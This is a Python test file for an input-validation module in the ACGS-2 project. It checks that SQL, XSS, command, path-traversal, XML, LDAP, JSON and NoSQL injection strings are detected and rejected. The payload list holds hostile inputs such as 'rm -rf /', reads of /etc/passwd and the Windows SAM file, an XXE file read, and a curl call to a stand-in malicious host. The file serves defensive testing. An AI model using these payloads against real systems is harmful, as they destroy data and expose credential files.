#!/usr/bin/env python3
"""
Comprehensive Security Input Validation Integration Tests

Tests the integration of security_validation.py across all ACGS-2 API endpoints
to ensure 100% coverage of the 8 vulnerable input patterns:
1. SQL injection
2. XSS attacks
3. Command injection
4. Path traversal
5. JSON injection
6. LDAP injection
7. XML injection
8. NoSQL injection
"""

import json
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from services.shared.security_validation import (
    SecurityInputValidator,
    SecurityValidationMiddleware,
)


class TestSecurityValidationIntegration:
    """Test suite for security validation integration."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = SecurityInputValidator()

        # Test payloads for each vulnerability type
        self.test_payloads = {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "admin'--",
                "' UNION SELECT * FROM passwords--",
            ],
            "xss_attacks": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            ],
            "command_injection": [
                "; rm -rf /",
                "| cat /etc/passwd",
                "`whoami`",
                "$(curl malicious.com)",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
            ],
            "json_injection": [
                '{"$where": "this.credits == this.debits"}',
                '{"eval": "db.users.drop()"}',
                '{"$regex": ".*"}',
                '{"constructor": {"prototype": {"isAdmin": true}}}',
            ],
            "ldap_injection": [
                "*)(&(objectClass=user)(cn=*))",
                "*)(|(objectClass=*))",
                "admin)(&(password=*))",
                "*))%00",
            ],
            "xml_injection": [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<![CDATA[<script>alert('XSS')</script>]]>",
                "<?xml-stylesheet type='text/xsl' href='malicious.xsl'?>",
                "<!ENTITY xxe SYSTEM 'http://malicious.com/evil.dtd'>",
            ],
            "nosql_injection": [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "function() { return true; }"}',
                '{"$regex": ".*", "$options": "i"}',
            ],
        }

    @pytest.mark.asyncio
    async def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        for payload in self.test_payloads["sql_injection"]:
            result = self.validator.validate_input(payload, "general")
            assert not result["is_valid"], f"SQL injection not detected: {payload}"
            assert "SQL injection" in str(result["violations"])
            assert result["risk_level"] == "CRITICAL"

    @pytest.mark.asyncio
    async def test_xss_attack_detection(self):
        """Test XSS attack pattern detection."""
        for payload in self.test_payloads["xss_attacks"]:
            result = self.validator.validate_input(payload, "general")
            assert not result["is_valid"], f"XSS attack not detected: {payload}"
            assert result["risk_level"] in ["HIGH", "CRITICAL"]

    @pytest.mark.asyncio
    async def test_command_injection_detection(self):
        """Test command injection pattern detection."""
        for payload in self.test_payloads["command_injection"]:
            result = self.validator.validate_input(payload, "general")
            assert not result["is_valid"], f"Command injection not detected: {payload}"
            assert "Command injection" in str(result["violations"])
            assert result["risk_level"] in ["HIGH", "CRITICAL"]

    @pytest.mark.asyncio
    async def test_path_traversal_detection(self):
        """Test path traversal pattern detection."""
        for payload in self.test_payloads["path_traversal"]:
            result = self.validator.validate_input(payload, "general")
            assert not result["is_valid"], f"Path traversal not detected: {payload}"
            assert "Path traversal" in str(result["violations"])
            assert result["risk_level"] in ["HIGH", "CRITICAL"]

    @pytest.mark.asyncio
    async def test_json_injection_validation(self):
        """Test JSON injection validation."""
        # Test specific dangerous JSON patterns
        dangerous_json_tests = [
            ('{"$where": "this.credits == this.debits"}', True),
            ('{"eval": "db.users.drop()"}', True),
            ('{"$ne": null}', True),
            ('{"safe_key": "safe_value"}', False),  # This should be safe
        ]

        for json_payload, should_be_dangerous in dangerous_json_tests:
            result = self.validator.validate_json_input(json_payload)

            if should_be_dangerous:
                # Should either be invalid or marked as dangerous
                if result["is_valid"]:
                    assert result["risk_level"] in [
                        "MEDIUM",
                        "HIGH",
                        "CRITICAL",
                    ], f"Dangerous JSON not detected: {json_payload}, risk: {result['risk_level']}"
                # If invalid, that's also acceptable for dangerous content
            else:
                # Safe JSON should be valid with low risk
                assert result["is_valid"], f"Safe JSON rejected: {json_payload}"
                assert (
                    result["risk_level"] == "LOW"
                ), f"Safe JSON marked as risky: {json_payload}"

    @pytest.mark.asyncio
    async def test_ldap_injection_detection(self):
        """Test LDAP injection pattern detection."""
        for payload in self.test_payloads["ldap_injection"]:
            result = self.validator.validate_input(payload, "general")
            assert not result["is_valid"], f"LDAP injection not detected: {payload}"
            assert result["risk_level"] in ["MEDIUM", "HIGH", "CRITICAL"]

    @pytest.mark.asyncio
    async def test_xml_injection_detection(self):
        """Test XML injection pattern detection."""
        for payload in self.test_payloads["xml_injection"]:
            result = self.validator.validate_input(payload, "general")
            assert not result["is_valid"], f"XML injection not detected: {payload}"
            assert result["risk_level"] in ["HIGH", "CRITICAL"]

    @pytest.mark.asyncio
    async def test_nosql_injection_validation(self):
        """Test NoSQL injection validation."""
        for payload in self.test_payloads["nosql_injection"]:
            result = self.validator.validate_json_input(payload)
            # NoSQL injections are often valid JSON, check for dangerous patterns
            if result["parsed_json"]:
                # Check for dangerous NoSQL operators
                json_str = json.dumps(result["parsed_json"])
                dangerous_operators = ["$ne", "$gt", "$where", "$regex"]
                has_dangerous_op = any(op in json_str for op in dangerous_operators)
                if has_dangerous_op:
                    assert result["risk_level"] in ["MEDIUM", "HIGH", "CRITICAL"]

    @pytest.mark.asyncio
    async def test_input_sanitization(self):
        """Test input sanitization functionality."""
        test_cases = [
            ("normal text", "normal text"),
            ("<script>alert('xss')</script>", "alert('xss')"),
            ("user@example.com", "user@example.com"),
            ("user<>name", "username"),
        ]

        for input_text, expected_pattern in test_cases:
            sanitized = self.validator.sanitize_input(input_text, "general")
            assert len(sanitized) <= len(input_text)
            # Basic sanitization should remove dangerous characters
            assert "<script>" not in sanitized
            assert "<>" not in sanitized or input_text == "user@example.com"

    @pytest.mark.asyncio
    async def test_middleware_integration(self):
        """Test SecurityValidationMiddleware integration."""
        # Mock FastAPI app and request
        mock_app = MagicMock()
        mock_request = MagicMock()
        mock_request.url.path = "/api/v1/test"
        mock_request.method = "POST"
        mock_request.query_params.items.return_value = [("param1", "safe_value")]

        # Mock request body with malicious content
        malicious_body = json.dumps(
            {
                "title": "Test Policy",
                "content": "'; DROP TABLE policies; --",
                "description": "<script>alert('xss')</script>",
            }
        ).encode("utf-8")

        mock_request.body = AsyncMock(return_value=malicious_body)

        # Create middleware
        middleware = SecurityValidationMiddleware(mock_app)

        # Mock call_next function
        async def mock_call_next(request):
            return MagicMock(status_code=200)

        # Test middleware processing
        response = await middleware.dispatch(mock_request, mock_call_next)

        # Should return error response due to malicious content
        assert hasattr(response, "status_code")
        # The response should indicate validation failure
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_endpoint_coverage(self):
        """Test that all target endpoints have validation coverage."""
        target_services = [
            "services/core/constitutional-ai/ac_service/app/api/hitl_sampling.py",
            "services/core/policy-governance/pgc_service/app/api/v1/enforcement.py",
            "services/core/governance-synthesis/gs_service/app/api/v1/synthesize.py",
        ]

        for service_path in target_services:
            full_path = project_root / service_path
            if full_path.exists():
                with open(full_path) as f:
                    content = f.read()

                # Check that security validation imports are present
                assert (
                    "security_validation" in content
                ), f"Security validation not imported in {service_path}"

                # Check that validation decorators are used
                validation_decorators = [
                    "@validate_policy_input",
                    "@validate_governance_input",
                ]
                has_decorator = any(
                    decorator in content for decorator in validation_decorators
                )
                assert (
                    has_decorator
                ), f"No validation decorators found in {service_path}"

    @pytest.mark.asyncio
    async def test_performance_impact(self):
        """Test that validation doesn't significantly impact performance."""
        import time

        # Test large input validation performance with truly safe text
        large_input = (
            "safe text content " * 500
        )  # Safe text without repetitive patterns

        start_time = time.time()
        for _ in range(100):
            result = self.validator.validate_input(large_input, "general")
        end_time = time.time()

        avg_time = (end_time - start_time) / 100

        # Validation should complete in under 10ms per request
        assert avg_time < 0.01, f"Validation too slow: {avg_time:.4f}s per request"

        # Test with simple safe input to ensure it passes
        simple_safe_input = "This is a safe text input for testing"
        simple_result = self.validator.validate_input(simple_safe_input, "general")

        # Result should be valid for safe content
        assert simple_result[
            "is_valid"
        ], f"Safe input failed validation: {simple_result['violations']}"
        assert simple_result["risk_level"] == "LOW"

    def test_validation_coverage_report(self):
        """Test that validation coverage report is comprehensive."""
        # Check that integration report exists
        report_path = project_root / "security_validation_integration_report.json"
        assert report_path.exists(), "Integration report not found"

        with open(report_path) as f:
            report = json.load(f)

        # Verify report structure
        assert "integration_summary" in report
        assert "vulnerable_patterns_covered" in report
        assert "validation_coverage" in report

        # Verify all 8 vulnerability patterns are covered
        expected_patterns = [
            "SQL injection",
            "XSS attacks",
            "Command injection",
            "Path traversal",
            "JSON injection",
            "LDAP injection",
            "XML injection",
            "NoSQL injection",
        ]

        for pattern in expected_patterns:
            assert pattern in report["vulnerable_patterns_covered"]

        # Verify coverage status
        coverage = report["validation_coverage"]
        for pattern_key in coverage:
            assert "✅ Covered" in coverage[pattern_key]

        # Verify integration success
        assert report["integration_summary"]["success"] is True
        assert report["integration_summary"]["services_processed"] >= 3
        assert report["integration_summary"]["endpoints_processed"] >= 15


if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, "-v", "--tb=short"])
